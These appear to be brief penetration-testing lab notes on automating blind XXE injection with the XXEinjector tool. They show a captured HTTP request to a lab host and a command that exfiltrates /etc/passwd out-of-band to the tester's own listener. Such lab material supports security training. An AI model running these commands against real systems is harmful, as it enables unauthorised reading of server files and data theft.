**AUTOMATE**
```shell-session
git clone https://github.com/enjoiz/XXEinjector.git
```

Copy Burp request --> add XXEINJECT at the end:
```http
POST /blind/submitDetails.php HTTP/1.1
Host: 10.129.201.94
Content-Length: 169
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko)
Content-Type: text/plain;charset=UTF-8
Accept: */*
Origin: http://10.129.201.94
Referer: http://10.129.201.94/blind/
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Connection: close

<?xml version="1.0" encoding="UTF-8"?>
XXEINJECT
```

**Example Command; file =  burp request.**
```shell-session
ruby XXEinjector.rb --host=10.10.15.157 --httpport=8000 --file=./xxetest.req --path=/etc/passwd --oob=http --phpfilter
```
